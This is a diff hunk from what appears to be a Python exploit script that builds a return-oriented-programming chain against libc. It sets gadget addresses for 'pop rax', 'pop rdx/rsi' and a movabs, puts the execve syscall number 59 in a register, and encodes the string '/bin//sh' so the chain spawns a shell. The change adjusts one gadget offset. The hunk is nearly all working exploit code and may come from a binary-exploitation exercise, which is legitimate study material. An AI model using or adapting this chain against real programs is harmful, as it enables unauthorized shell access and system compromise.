@@ -8,9 +8,10 @@ import binascii
 LIBC_OFFSET = 0x7ffff7a3a000
 g1 = LIBC_OFFSET + 0xe76fa # pop rax ; ret
 d1 = 59
-g2 = LIBC_OFFSET + 0x1ab776 + 0x1d #=0x7FFFF7BE5793  pop rdx + rsi
+g2 = LIBC_OFFSET + 0x18ac7c + 0x2c #=0x7FFFF7BE5793  pop rdx + rsi
 d2 = 0
 d3 = 0
+
 g3 = LIBC_OFFSET + 0xb8993 + 0xe #=0x7FFFF7AF29A1   movabs $7526411283028599343, rcx
 d4 = 0x68732f2f6e69622f #integer out of range for 'q' format code
 d5 = 0
